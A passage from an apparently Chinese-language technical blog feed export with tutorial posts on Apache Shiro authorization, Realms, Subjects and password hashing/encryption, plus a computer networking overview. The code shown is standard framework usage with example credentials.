在登录 Servlet 中通过 shiroLoginFailure 得到 authc 登录失败时的异常类型名，然后根据此异常名来决定显示什么错误消息。 测试 输入 http://localhost:8080/chapter7/role，会跳转到 “/formfilterlogin” 登录表单，提交表单如果 authc 拦截器登录成功后，会直接重定向会之前的地址 “/role”；假设我们直接访问 “/formfilterlogin” 的话登录成功将直接到默认的 successUrl。 授权（角色 / 权限验证）shiro.ini 123456[main]roles.unauthorizedUrl=/unauthorizedperms.unauthorizedUrl=/unauthorized [urls]/role=authc,roles[admin]/permission=authc,perms[&quot;user:create&quot;]&amp;nbsp; 通过 unauthorizedUrl 属性指定如果授权失败时重定向到的地址。roles 是 org.apache.shiro.web.filter.authz.RolesAuthorizationFilter 类型的实例，通过参数指定访问时需要的角色，如 “[admin]”，如果有多个使用 “，” 分割，且验证时是 hasAllRole 验证，即且的关系。Perms 是 org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter 类型的实例，和 roles 类似，只是验证权限字符串。 web.xml 把 shiroConfigLocations 改为 shiro.ini 即可。 RoleServlet/PermissionServlet 1234567891011121314151617181920@WebServlet(name = &quot;permissionServlet&quot;, urlPatterns = &quot;/permission&quot;)public class PermissionServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; Subject subject = SecurityUtils.getSubject(); subject.checkPermission(&quot;user:create&quot;); req.getRequestDispatcher(&quot;/WEB-INF/jsp/hasPermission.jsp&quot;).forward(req, resp); &#125;&#125;@WebServlet(name = &quot;roleServlet&quot;, urlPatterns = &quot;/role&quot;)public class RoleServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; Subject subject = SecurityUtils.getSubject(); subject.checkRole(&quot;admin&quot;); req.getRequestDispatcher(&quot;/WEB-INF/jsp/hasRole.jsp&quot;).forward(req, resp); &#125;&#125;&amp;nbsp; 测试 首先访问 http://localhost:8080/chapter7/login，使用帐号 “zhang/123” 进行登录，再访问 /role 或 /permission 时会跳转到成功页面（因为其授权成功了）；如果使用帐号 “wang/123” 登录成功后访问这两个地址会跳转到 “/unauthorized” 即没有授权页面。 退出shiro.ini 12[urls]/logout=anon&amp;nbsp; 指定 /logout 使用 anon 拦截器即可，即不需要登录即可访问。 LogoutServlet 12345678@WebServlet(name = &quot;logoutServlet&quot;, urlPatterns = &quot;/logout&quot;)public class LogoutServlet extends HttpServlet &#123; protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; SecurityUtils.getSubject().logout(); req.getRequestDispatcher(&quot;/WEB-INF/jsp/logoutSuccess.jsp&quot;).forward(req, resp); &#125;&#125;&amp;nbsp; 直接调用 Subject.logout 即可，退出成功后转发 / 重定向到相应页面即可。 测试 首先访问 http://localhost:8080/chapter7/login，使用帐号 “zhang/123” 进行登录，登录成功后访问 /logout 即可退出。 Shiro 也提供了 logout 拦截器用于退出，其是 org.apache.shiro.web.filter.authc.LogoutFilter 类型的实例，我们可以在 shiro.ini 配置文件中通过如下配置完成退出： 1234[main]logout.redirectUrl=/login[urls]/logout2=logout&amp;nbsp; 通过 logout.redirectUrl 指定退出后重定向的地址；通过 /logout2=logout 指定退出 url 是 /logout2。这样当我们登录成功后然后访问 /logout2 即可退出。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络概述]]></title>
    <url>%2F2018%2F11%2F13%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[网络的网络网络把主机连接起来，而互联网是把多种不同的网络连接起来，因此互联网是网络的网络。 ISP互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。 目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。 主机之间的通信方式 客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。 对等（P2P）：不区分客户和服务器。 电路交换与分组交换1. 电路交换电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。 2. 分组交换每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。 在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。 时延总时延 = 排队时延 + 处理时延 + 传输时延 + 传播时延 1. 排队时延分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。 2. 处理时延主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。 3. 传输时延主机或路由器传输数据帧所需要的时间。 其中 l 表示数据帧的长度，v 表示传输速率。 4. 传播时延电磁波在信道中传播所需要花费的时间，电磁波传播的速度接近光速。 其中 l 表示信道长度，v 表示电磁波在信道上的传播速度。 计算机网络体系结构 1. 五层协议 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等协议。数据单位为报文。 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。 2. OSI其中表示层和会话层用途如下： 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。 会话层 ：建立及管理会话。 五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。 3. TCP/IP它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。 4. 数据在各层之间的传递过程在向下传递的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。 路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要传输层和应用层。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>ISP</tag>
        <tag>时延</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Realm]]></title>
    <url>%2F2018%2F11%2F09%2FRealm%2F</url>
    <content type="text"><![CDATA[Realm 及相关对象Realm【Realm】及【Authorizer】部分都已经详细介绍过 Realm 了，接下来再来看一下一般真实环境下的 Realm 如何实现。 1、定义实体及关系 即用户 - 角色之间是多对多关系，角色 - 权限之间是多对多关系；且用户和权限之间通过角色建立关系；在系统中验证时通过权限验证，角色只是权限集合，即所谓的显示角色；其实权限应该对应到资源（如菜单、URL、页面按钮、Java 方法等）中，即应该将权限字符串存储到资源实体中，但是目前为了简单化，直接提取一个权限表，【综合示例】部分会使用完整的表结构。 用户实体包括：编号 (id)、用户名 (username)、密码 (password)、盐 (salt)、是否锁定 (locked)；是否锁定用于封禁用户使用，其实最好使用 Enum 字段存储，可以实现更复杂的用户状态实现。 角色实体包括：、编号 (id)、角色标识符（role）、描述（description）、是否可用（available）；其中角色标识符用于在程序中进行隐式角色判断的，描述用于以后再前台界面显示的、是否可用表示角色当前是否激活。 权限实体包括：编号（id）、权限标识符（permission）、描述（description）、是否可用（available）；含义和角色实体类似不再阐述。 另外还有两个关系实体：用户 - 角色实体（用户编号、角色编号，且组合为复合主键）；角色 - 权限实体（角色编号、权限编号，且组合为复合主键）。 sql 及实体请参考源代码中的 sql\shiro.sql 和 com.github.zhangkaitao.shiro.chapter6.entity 对应的实体。 2、环境准备 为了方便数据库操作，使用了 “org.springframework: spring-jdbc: 4.0.0.RELEASE” 依赖，虽然是 spring4 版本的，但使用上和 spring3 无区别。其他依赖请参考源码的 pom.xml。 3、定义 Service 及 Dao 为了实现的简单性，只实现必须的功能，其他的可以自己实现即可。 PermissionService 1234public interface PermissionService &#123; public Permission createPermission(Permission permission); public void deletePermission(Long permissionId);&#125; 实现基本的创建 / 删除权限。 RoleService 12345678public interface RoleService &#123; public Role createRole(Role role); public void deleteRole(Long roleId); //添加角色-权限之间关系 public void correlationPermissions(Long roleId, Long... permissionIds); //移除角色-权限之间关系 public void uncorrelationPermissions(Long roleId, Long... permissionIds);//&#125;&amp;nbsp; 相对于 PermissionService 多了关联 / 移除关联角色 - 权限功能。 UserService 123456789public interface UserService &#123; public User createUser(User user); //创建账户 public void changePassword(Long userId, String newPassword);//修改密码 public void correlationRoles(Long userId, Long... roleIds); //添加用户-角色关系 public void uncorrelationRoles(Long userId, Long... roleIds);// 移除用户-角色关系 public User findByUsername(String username);// 根据用户名查找用户 public Set&lt;String&gt; findRoles(String username);// 根据用户名查找其角色 public Set&lt;String&gt; findPermissions(String username); //根据用户名查找其权限&#125;&amp;nbsp; 此处使用 findByUsername、findRoles 及 findPermissions 来查找用户名对应的帐号、角色及权限信息。之后的 Realm 就使用这些方法来查找相关信息。 UserServiceImpl 1234567891011public User createUser(User user) &#123; //加密密码 passwordHelper.encryptPassword(user); return userDao.createUser(user);&#125;public void changePassword(Long userId, String newPassword) &#123; User user =userDao.findOne(userId); user.setPassword(newPassword); passwordHelper.encryptPassword(user); userDao.updateUser(user);&#125;&amp;nbsp; 在创建账户及修改密码时直接把生成密码操作委托给 PasswordHelper。 PasswordHelper 123456789101112131415public class PasswordHelper &#123; private RandomNumberGenerator randomNumberGenerator = new SecureRandomNumberGenerator(); private String algorithmName = &quot;md5&quot;; private final int hashIterations = 2; public void encryptPassword(User user) &#123; user.setSalt(randomNumberGenerator.nextBytes().toHex()); String newPassword = new SimpleHash( algorithmName, user.getPassword(), ByteSource.Util.bytes(user.getCredentialsSalt()), hashIterations).toHex(); user.setPassword(newPassword); &#125;&#125;&amp;nbsp; 之后的 CredentialsMatcher 需要和此处加密的算法一样。user.getCredentialsSalt() 辅助方法返回 username+salt。 为了节省篇幅，对于 DAO/Service 的接口及实现，具体请参考源码com.github.zhangkaitao.shiro.chapter6。另外请参考 Service 层的测试用例 com.github.zhangkaitao.shiro.chapter6.service.ServiceTest。 4、定义 Realm RetryLimitHashedCredentialsMatcher和第五章的一样，在此就不罗列代码了，请参考源码 com.github.zhangkaitao.shiro.chapter6.credentials.RetryLimitHashedCredentialsMatcher。 UserRealm 另外请参考 Service 层的测试用例 com.github.zhangkaitao.shiro.chapter6.service.ServiceTest。 12345678910111213141516171819202122232425262728public class UserRealm extends AuthorizingRealm &#123; private UserService userService = new UserServiceImpl(); protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; String username = (String)principals.getPrimaryPrincipal(); SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo(); authorizationInfo.setRoles(userService.findRoles(username)); authorizationInfo.setStringPermissions(userService.findPermissions(username)); return authorizationInfo; &#125; protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; String username = (String)token.getPrincipal(); User user = userService.findByUsername(username); if(user == null) &#123; throw new UnknownAccountException();//没找到帐号 &#125; if(Boolean.TRUE.equals(user.getLocked())) &#123; throw new LockedAccountException(); //帐号锁定 &#125; //交给AuthenticatingRealm使用CredentialsMatcher进行密码匹配，如果觉得人家的不好可以在此判断或自定义实现 SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo( user.getUsername(), //用户名 user.getPassword(), //密码 ByteSource.Util.bytes(user.getCredentialsSalt()),//salt=username+salt getName() //realm name ); return authenticationInfo; &#125;&#125;&amp;nbsp; 1、UserRealm 父类 AuthorizingRealm 将获取 Subject 相关信息分成两步：获取身份验证信息（doGetAuthenticationInfo）及授权信息（doGetAuthorizationInfo）； 2、doGetAuthenticationInfo 获取身份验证相关信息：首先根据传入的用户名获取 User 信息；然后如果 user 为空，那么抛出没找到帐号异常 UnknownAccountException；如果 user 找到但锁定了抛出锁定异常 LockedAccountException；最后生成 AuthenticationInfo 信息，交给间接父类 AuthenticatingRealm 使用 CredentialsMatcher 进行判断密码是否匹配，如果不匹配将抛出密码错误异常 IncorrectCredentialsException；另外如果密码重试此处太多将抛出超出重试次数异常 ExcessiveAttemptsException；在组装 SimpleAuthenticationInfo 信息时，需要传入：身份信息（用户名）、凭据（密文密码）、盐（username+salt），CredentialsMatcher 使用盐加密传入的明文密码和此处的密文密码进行匹配。 3、doGetAuthorizationInfo 获取授权信息：PrincipalCollection 是一个身份集合，因为我们现在就一个 Realm，所以直接调用 getPrimaryPrincipal 得到之前传入的用户名即可；然后根据用户名调用 UserService 接口获取角色及权限信息。 5、测试用例 为了节省篇幅，请参考测试用例 com.github.zhangkaitao.shiro.chapter6.realm.UserRealmTest。包含了：登录成功、用户名错误、密码错误、密码超出重试次数、有 / 没有角色、有 / 没有权限的测试。 AuthenticationToken AuthenticationToken 用于收集用户提交的身份（如用户名）及凭据（如密码）： 1234public interface AuthenticationToken extends Serializable &#123; Object getPrincipal(); //身份 Object getCredentials(); //凭据&#125;&amp;nbsp; 扩展接口 RememberMeAuthenticationToken：提供了 “boolean isRememberMe()” 现“记住我”的功能； 扩展接口是 HostAuthenticationToken：提供了 “String getHost()” 方法用于获取用户 “主机” 的功能。 Shiro 提供了一个直接拿来用的 UsernamePasswordToken，用于实现用户名 / 密码 Token 组，另外其实现了 RememberMeAuthenticationToken 和 HostAuthenticationToken，可以实现记住我及主机验证的支持。 AuthenticationInfo AuthenticationInfo 有两个作用： 如果 Realm 是 AuthenticatingRealm 子类，则提供给 AuthenticatingRealm 内部使用的 CredentialsMatcher 进行凭据验证；（如果没有继承它需要在自己的 Realm 中自己实现验证）； 提供给 SecurityManager 来创建 Subject（提供身份信息）； MergableAuthenticationInfo 用于提供在多 Realm 时合并 AuthenticationInfo 的功能，主要合并 Principal、如果是其他的如 credentialsSalt，会用后边的信息覆盖前边的。 比如 HashedCredentialsMatcher，在验证时会判断 AuthenticationInfo 是否是 SaltedAuthenticationInfo 子类，来获取盐信息。 Account 相当于我们之前的 User，SimpleAccount 是其一个实现；在 IniRealm、PropertiesRealm 这种静态创建帐号信息的场景中使用，这些 Realm 直接继承了 SimpleAccountRealm，而 SimpleAccountRealm 提供了相关的 API 来动态维护 SimpleAccount；即可以通过这些 API 来动态增删改查 SimpleAccount；动态增删改查角色 / 权限信息。及如果您的帐号不是特别多，可以使用这种方式，具体请参考 SimpleAccountRealm Javadoc。 其他情况一般返回 SimpleAuthenticationInfo 即可。 PrincipalCollection 因为我们可以在 Shiro 中同时配置多个 Realm，所以呢身份信息可能就有多个；因此其提供了 PrincipalCollection 用于聚合这些身份信息： 12345678910public interface PrincipalCollection extends Iterable, Serializable &#123; Object getPrimaryPrincipal(); //得到主要的身份 &lt;T&gt; T oneByType(Class&lt;T&gt; type); //根据身份类型获取第一个 &lt;T&gt; Collection&lt;T&gt; byType(Class&lt;T&gt; type); //根据身份类型获取一组 List asList(); //转换为List Set asSet(); //转换为Set Collection fromRealm(String realmName); //根据Realm名字获取 Set&lt;String&gt; getRealmNames(); //获取所有身份验证通过的Realm名字 boolean isEmpty(); //判断是否为空&#125;&amp;nbsp; 因为 PrincipalCollection 聚合了多个，此处最需要注意的是 getPrimaryPrincipal，如果只有一个 Principal 那么直接返回即可，如果有多个 Principal，则返回第一个（因为内部使用 Map 存储，所以可以认为是返回任意一个）；oneByType / byType 根据凭据的类型返回相应的 Principal；fromRealm 根据 Realm 名字（每个 Principal 都与一个 Realm 关联）获取相应的 Principal。 MutablePrincipalCollection 是一个可变的 PrincipalCollection 接口，即提供了如下可变方法： 123456public interface MutablePrincipalCollection extends PrincipalCollection &#123; void add(Object principal, String realmName); //添加Realm-Principal的关联 void addAll(Collection principals, String realmName); //添加一组Realm-Principal的关联 void addAll(PrincipalCollection principals);//添加PrincipalCollection void clear();//清空&#125;&amp;nbsp; 目前 Shiro 只提供了一个实现 SimplePrincipalCollection，还记得之前的 AuthenticationStrategy 实现嘛，用于在多 Realm 时判断是否满足条件的，在大多数实现中（继承了 AbstractAuthenticationStrategy）afterAttempt 方法会进行 AuthenticationInfo（实现了 MergableAuthenticationInfo）的 merge，比如 SimpleAuthenticationInfo 会合并多个 Principal 为一个 PrincipalCollection。 对于 PrincipalMap 是 Shiro 1.2 中的一个实验品，暂时无用，具体可以参考其 Javadoc。接下来通过示例来看看 PrincipalCollection。 1、准备三个 Realm MyRealm1 123456789101112131415public class MyRealm1 implements Realm &#123; @Override public String getName() &#123; return &quot;a&quot;; //realm name 为 “a” &#125; //省略supports方法，具体请见源码 @Override public AuthenticationInfo getAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; return new SimpleAuthenticationInfo( &quot;zhang&quot;, //身份 字符串类型 &quot;123&quot;, //凭据 getName() //Realm Name ); &#125;&#125; MyRealm2 和 MyRealm1 完全一样，只是 Realm 名字为 b。 MyRealm3 12345678910111213141516public class MyRealm3 implements Realm &#123; @Override public String getName() &#123; return &quot;c&quot;; //realm name 为 “c” &#125; //省略supports方法，具体请见源码 @Override public AuthenticationInfo getAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; User user = new User(&quot;zhang&quot;, &quot;123&quot;); return new SimpleAuthenticationInfo( user, //身份 User类型 &quot;123&quot;, //凭据 getName() //Realm Name ); &#125;&#125;&amp;nbsp; 和 MyRealm1 同名，但返回的 Principal 是 User 类型。 2、ini 配置（shiro-multirealm.ini） 12345[main]realm1=com.github.zhangkaitao.shiro.chapter6.realm.MyRealm1realm2=com.github.zhangkaitao.shiro.chapter6.realm.MyRealm2realm3=com.github.zhangkaitao.shiro.chapter6.realm.MyRealm3securityManager.realms=$realm1,$realm2,$realm3&amp;nbsp; 3、测试用例（com.github.zhangkaitao.shiro.chapter6.realm.PrincialCollectionTest） 因为我们的 Realm 中没有进行身份及凭据验证，所以相当于身份验证都是成功的，都将返回： 123Object primaryPrincipal1 = subject.getPrincipal();PrincipalCollection princialCollection = subject.getPrincipals();Object primaryPrincipal2 = princialCollection.getPrimaryPrincipal();&amp;nbsp; 我们可以直接调用 subject.getPrincipal 获取 PrimaryPrincipal（即所谓的第一个）；或者通过 getPrincipals 获取 PrincipalCollection；然后通过其 getPrimaryPrincipal 获取 PrimaryPrincipal。 1Set&lt;String&gt; realmNames = princialCollection.getRealmNames(); 获取所有身份验证成功的 Realm 名字。 1Set&lt;Object&gt; principals = princialCollection.asSet(); //asList 和 asSet 的结果一样 将身份信息转换为 Set/List，即使转换为 List，也是先转换为 Set 再完成的。 1Collection&lt;User&gt; users = princialCollection.fromRealm(&quot;c&quot;); 根据 Realm 名字获取身份，因为 Realm 名字可以重复，所以可能多个身份，建议 Realm 名字尽量不要重复。 AuthorizationInfo AuthorizationInfo 用于聚合授权信息的： 12345public interface AuthorizationInfo extends Serializable &#123; Collection&lt;String&gt; getRoles(); //获取角色字符串信息 Collection&lt;String&gt; getStringPermissions(); //获取权限字符串信息 Collection&lt;Permission&gt; getObjectPermissions(); //获取Permission对象信息&#125;&amp;nbsp; 当我们使用 AuthorizingRealm 时，如果身份验证成功，在进行授权时就通过 doGetAuthorizationInfo 方法获取角色 / 权限信息用于授权验证。 Shiro 提供了一个实现 SimpleAuthorizationInfo，大多数时候使用这个即可。 对于 Account 及 SimpleAccount，之前的【6.3 AuthenticationInfo】已经介绍过了，用于 SimpleAccountRealm 子类，实现动态角色 / 权限维护的。 Subject Subject 是 Shiro 的核心对象，基本所有身份验证、授权都是通过 Subject 完成。 1、身份信息获取 12Object getPrincipal(); //Primary PrincipalPrincipalCollection getPrincipals(); // PrincipalCollection&amp;nbsp; 2、身份验证 123void login(AuthenticationToken token) throws AuthenticationException;boolean isAuthenticated();boolean isRemembered(); 通过 login 登录，如果登录失败将抛出相应的 AuthenticationException，如果登录成功调用 isAuthenticated 就会返回 true，即已经通过身份验证；如果 isRemembered 返回 true，表示是通过记住我功能登录的而不是调用 login 方法登录的。isAuthenticated/isRemembered 是互斥的，即如果其中一个返回 true，另一个返回 false。 3、角色授权验证 123456boolean hasRole(String roleIdentifier);boolean[] hasRoles(List&lt;String&gt; roleIdentifiers);boolean hasAllRoles(Collection&lt;String&gt; roleIdentifiers);void checkRole(String roleIdentifier) throws AuthorizationException;void checkRoles(Collection&lt;String&gt; roleIdentifiers) throws AuthorizationException;void checkRoles(String... roleIdentifiers) throws AuthorizationException;&amp;nbsp; hasRole 进行角色验证，验证后返回 true/false；而 checkRole 验证失败时抛出 AuthorizationException 异常。 4、权限授权验证 12345678910boolean isPermitted(String permission);boolean isPermitted(Permission permission);boolean[] isPermitted(String... permissions);boolean[] isPermitted(List&lt;Permission&gt; permissions);boolean isPermittedAll(String... permissions);boolean isPermittedAll(Collection&lt;Permission&gt; permissions);void checkPermission(String permission) throws AuthorizationException;void checkPermission(Permission permission) throws AuthorizationException;void checkPermissions(String... permissions) throws AuthorizationException;void checkPermissions(Collection&lt;Permission&gt; permissions) throws AuthorizationException; isPermitted 进行权限验证，验证后返回 true/false；而 checkPermission 验证失败时抛出 AuthorizationException。 5、会话 12Session getSession(); //相当于getSession(true)Session getSession(boolean create); &amp;nbsp; 类似于 Web 中的会话。如果登录成功就相当于建立了会话，接着可以使用 getSession 获取；如果 create=false 如果没有会话将返回 null，而 create=true 如果没有会话会强制创建一个。 6、退出 1void logout(); 7、RunAs 1234void runAs(PrincipalCollection principals) throws NullPointerException, IllegalStateException;boolean isRunAs();PrincipalCollection getPreviousPrincipals();PrincipalCollection releaseRunAs();&amp;nbsp; RunAs 即实现 “允许 A 假设为 B 身份进行访问”；通过调用 subject.runAs(b) 进行访问；接着调用 subject.getPrincipals 将获取到 B 的身份；此时调用 isRunAs 将返回 true；而 a 的身份需要通过 subject. getPreviousPrincipals 获取；如果不需要 RunAs 了调用 subject. releaseRunAs 即可。 8、多线程 1234&lt;V&gt; V execute(Callable&lt;V&gt; callable) throws ExecutionException;void execute(Runnable runnable);&lt;V&gt; Callable&lt;V&gt; associateWith(Callable&lt;V&gt; callable);Runnable associateWith(Runnable runnable);&amp;nbsp; 实现线程之间的 Subject 传播，因为 Subject 是线程绑定的；因此在多线程执行中需要传播到相应的线程才能获取到相应的 Subject。最简单的办法就是通过 execute(runnable/callable 实例) 直接调用；或者通过 associateWith(runnable/callable 实例) 得到一个包装后的实例；它们都是通过：1、把当前线程的 Subject 绑定过去；2、在线程执行结束后自动释放。 Subject 自己不会实现相应的身份验证 / 授权逻辑，而是通过 DelegatingSubject 委托给 SecurityManager 实现；及可以理解为 Subject 是一个面门。 对于 Subject 的构建一般没必要我们去创建；一般通过 SecurityUtils.getSubject() 获取： 12345678public static Subject getSubject() &#123; Subject subject = ThreadContext.getSubject(); if (subject == null) &#123; subject = (new Subject.Builder()).buildSubject(); ThreadContext.bind(subject); &#125; return subject;&#125;&amp;nbsp; 即首先查看当前线程是否绑定了 Subject，如果没有通过 Subject.Builder 构建一个然后绑定到现场返回。 如果想自定义创建，可以通过： 1new Subject.Builder().principals(身份).authenticated(true/false).buildSubject() 这种可以创建相应的 Subject 实例了，然后自己绑定到线程即可。在 new Builder() 时如果没有传入 SecurityManager，自动调用 SecurityUtils.getSecurityManager 获取；也可以自己传入一个实例。 对于 Subject 我们一般这么使用： 身份验证（login） 授权（hasRole/isPermitted 或 checkRole/checkPermission） 将相应的数据存储到会话（Session） 切换身份（RunAs）/ 多线程身份传播 退出 而我们必须的功能就是 1、2、5。到目前为止我们就可以使用 Shiro 进行应用程序的安全控制了，但是还是缺少如对 Web 验证、Java 方法验证等的一些简化实现。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>Realm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码加密]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[编码/加密在涉及到密码存储问题上，应该加密 / 生成密码摘要存储，而不是存储明文密码。比如之前的 600w csdn 账号泄露对用户可能造成很大损失，因此应加密 / 生成不可逆的摘要方式存储。 编码 / 解码Shiro 提供了 base64 和 16 进制字符串编码 / 解码的 API 支持，方便一些编码解码操作。Shiro 内部的一些数据的存储 / 表示都使用了 base64 和 16 进制字符串。 1234String str = &quot;hello&quot;;String base64Encoded = Base64.encodeToString(str.getBytes());String str2 = Base64.decodeToString(base64Encoded);Assert.assertEquals(str, str2);&amp;nbsp; 通过如上方式可以进行 base64 编码 / 解码操作，更多 API 请参考其 Javadoc。 1234String str = &quot;hello&quot;;String base64Encoded = Hex.encodeToString(str.getBytes());String str2 = new String(Hex.decode(base64Encoded.getBytes()));Assert.assertEquals(str, str2);&amp;nbsp; 通过如上方式可以进行 16 进制字符串编码 / 解码操作，更多 API 请参考其 Javadoc。 还有一个可能经常用到的类 CodecSupport，提供了 toBytes(str,”utf-8”) / toString(bytes,”utf-8”) 用于在 byte 数组 /String 之间转换。 散列算法散列算法一般用于生成数据的摘要信息，是一种不可逆的算法，一般适合存储密码之类的数据，常见的散列算法如 MD5、SHA 等。一般进行散列时最好提供一个 salt（盐），比如加密密码 “admin”，产生的散列值是 “21232f297a57a5a743894a0e4a801fc3”，可以到一些 md5 解密网站很容易的通过散列值得到密码 “admin”，即如果直接对密码进行散列相对来说破解更容易，此时我们可以加一些只有系统知道的干扰数据，如用户名和 ID（即盐）；这样散列的对象是 “密码 + 用户名 +ID”，这样生成的散列值相对来说更难破解。 123String str = &quot;hello&quot;;String salt = &quot;123&quot;;String md5 = new Md5Hash(str, salt).toString();//还可以转换为 toBase64()/toHex()&amp;nbsp; 如上代码通过盐 “123”MD5 散列 “hello”。另外散列时还可以指定散列次数，如 2 次表示：md5(md5(str))：“new Md5Hash(str, salt, 2).toString()”。 123String str = &quot;hello&quot;;String salt = &quot;123&quot;;String sha1 = new Sha256Hash(str, salt).toString();&amp;nbsp; 使用 SHA256 算法生成相应的散列数据，另外还有如 SHA1、SHA512 算法。 Shiro 还提供了通用的散列支持： 1234String str = &quot;hello&quot;;String salt = &quot;123&quot;;//内部使用MessageDigestString simpleHash = new SimpleHash(&quot;SHA-1&quot;, str, salt).toString();&amp;nbsp; 通过调用 SimpleHash 时指定散列算法，其内部使用了 Java 的 MessageDigest 实现。 为了方便使用，Shiro 提供了 HashService，默认提供了 DefaultHashService 实现。 12345678910DefaultHashService hashService = new DefaultHashService(); //默认算法SHA-512hashService.setHashAlgorithmName(&quot;SHA-512&quot;);hashService.setPrivateSalt(new SimpleByteSource(&quot;123&quot;)); //私盐，默认无hashService.setGeneratePublicSalt(true);//是否生成公盐，默认falsehashService.setRandomNumberGenerator(new SecureRandomNumberGenerator());//用于生成公盐。默认就这个hashService.setHashIterations(1); //生成Hash值的迭代次数HashRequest request = new HashRequest.Builder() .setAlgorithmName(&quot;MD5&quot;).setSource(ByteSource.Util.bytes(&quot;hello&quot;)) .setSalt(ByteSource.Util.bytes(&quot;123&quot;)).setIterations(2).build();String hex = hashService.computeHash(request).toHex();&amp;nbsp; 首先创建一个 DefaultHashService，默认使用 SHA-512 算法； 以通过 hashAlgorithmName 属性修改算法； 可以通过 privateSalt 设置一个私盐，其在散列时自动与用户传入的公盐混合产生一个新盐； 可以通过 generatePublicSalt 属性在用户没有传入公盐的情况下是否生成公盐； 可以设置 randomNumberGenerator 用于生成公盐； 可以设置 hashIterations 属性来修改默认加密迭代次数； 需要构建一个 HashRequest，传入算法、数据、公盐、迭代次数。 SecureRandomNumberGenerator 用于生成一个随机数： 1234SecureRandomNumberGenerator randomNumberGenerator = new SecureRandomNumberGenerator();randomNumberGenerator.setSeed(&quot;123&quot;.getBytes());String hex = randomNumberGenerator.nextBytes().toHex();&amp;nbsp; 加密 / 解密Shiro 还提供对称式加密 / 解密算法的支持，如 AES、Blowfish 等；当前还没有提供对非对称加密 / 解密算法支持，未来版本可能提供。 AES 算法实现： 123456789101112AesCipherService aesCipherService = new AesCipherService();aesCipherService.setKeySize(128); //设置key长度//生成keyKey key = aesCipherService.generateNewKey();String text = &quot;hello&quot;;//加密String encrptText = aesCipherService.encrypt(text.getBytes(), key.getEncoded()).toHex();//解密String text2 = new String(aesCipherService.decrypt(Hex.decode(encrptText), key.getEncoded()).getBytes());Assert.assertEquals(text, text2);&amp;nbsp; 更多算法请参考示例 com.github.zhangkaitao.shiro.chapter5.hash.CodecAndCryptoTest。 PasswordService/CredentialsMatcherShiro 提供了 PasswordService 及 CredentialsMatcher 用于提供加密密码及验证密码服务。 12345678public interface PasswordService &#123; //输入明文密码得到密文密码 String encryptPassword(Object plaintextPassword) throws IllegalArgumentException;&#125;public interface CredentialsMatcher &#123; //匹配用户输入的token的凭证（未加密）与系统提供的凭证（已加密） boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info);&#125;&amp;nbsp; Shiro 默认提供了 PasswordService 实现 